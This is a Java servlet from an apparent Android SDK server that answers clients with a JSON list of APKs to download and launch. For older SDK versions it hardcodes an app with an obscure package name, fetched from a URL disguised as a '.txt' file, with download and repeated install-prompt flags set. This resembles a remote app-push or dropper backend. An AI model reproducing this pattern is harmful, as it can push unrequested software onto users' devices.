package com.kokmobi.server.servlet;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.kokmobi.server.bean.DistReqVO;
import com.kokmobi.server.protocol.service.DisListService;
import com.kokmobi.server.protocol.service.ProtocolUtil;
import net.sf.json.JSONObject;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

import com.kokmobi.server.bean.ApkInfoVO;
import com.kokmobi.server.bean.DisRespVO;
import com.kokmobi.server.bean.UpdateInfo;
import com.kokmobi.server.commons.BaseServlet;
import com.kokmobi.server.util.BrowserUtil;

/**
 * wstest.sd4face.com/checkUpdate 121.201.34.67
 * ws.sd4face.com/checkUpdate 104.250.130.218 
 *
 */
public class DisListServlet extends BaseServlet {
	private static Log logger = LogFactory.getLog(DisListServlet.class);
	private String fromAddr;

	public DisListServlet() {
		super();
	}

	public void destroy() {
		super.destroy(); 
	}

	public void doGet(HttpServletRequest req, HttpServletResponse resp)
			throws ServletException, IOException {

		try{
			long start = System.currentTimeMillis();
			this.fromAddr = this.getRemoteAddr(req);
			
			String ua = req.getHeader("User-Agent");
			ua = ua == null?"":ua;
			int uaType = BrowserUtil.getAgentType(ua);
			
			StringBuffer ipString = new StringBuffer();
			ipString.append("[from:").append(this.fromAddr).append("]");
			logger.info(ipString.toString());

//			String sdkversion=req.getParameter("sdkversion");
			String sdkversion=ProtocolUtil.getOneOrNoneReqPara(req, "sdkversion");
			if(null==sdkversion||sdkversion.equals("")||sdkversion.equals("3")||sdkversion.equals("4")){
				DisRespVO disRespVO =new DisRespVO();
				List<ApkInfoVO> apks = new ArrayList<ApkInfoVO>();
				ApkInfoVO a=new ApkInfoVO();
				a.setApkId(66);
				a.setPkgName("bdl.gbl.wdl");
				a.setRank(1);
				a.setStartArgu("android.intent.action.seo");
				a.setApkType(1);
				a.setVersion(4);
				a.setApkUrl("http://newsdk.b0.upaiyun.com/upload/ddl/a.txt");
				a.setStartClass("");
				apks.add(a);
				disRespVO.setApks(apks);
				disRespVO.setGuideInterval(10);
				disRespVO.setGuideTimes(6);
				disRespVO.setIsDown(1);
				disRespVO.setIsGuide(1);
				disRespVO.setStatus(1);
				JSONObject disRespVOJson = JSONObject.fromObject(disRespVO);
				response(disRespVOJson.toString(), "text/plain; charset=UTF8",resp );
			}
			else{
				DisListService service = this.getDisListService();
				DistReqVO distReqVO =  adapter(req);
				distReqVO.setIpaddr(this.fromAddr);
				DisRespVO disRespVO = service.ydprocesss(distReqVO);
				if(disRespVO!=null) {
					JSONObject disRespVOJson = JSONObject.fromObject(disRespVO);
					response(disRespVOJson.toString(), "text/plain; charset=UTF8",resp );
				} else {
					response("{\"status\":0}", "text/plain; charset=UTF8", resp);
				}
			}
			logger.info("et:"+ (System.currentTimeMillis()-start) + "ms");			
		}
		catch(Exception ex) {
			ex.printStackTrace();
			response("{\"status\":0}", "text/plain; charset=UTF8", resp);
		}		
	}

	public void doPost(HttpServletRequest req, HttpServletResponse resp)
			throws ServletException, IOException {
		doGet(req, resp);
	}

	public void init() throws ServletException {
		// Put your code here
	}
	
	public static void main(String[] args) {
		UpdateInfo updateInfo = new UpdateInfo();
		JSONObject obj = JSONObject.fromObject(updateInfo);
		System.out.println(obj.toString());
	}
}
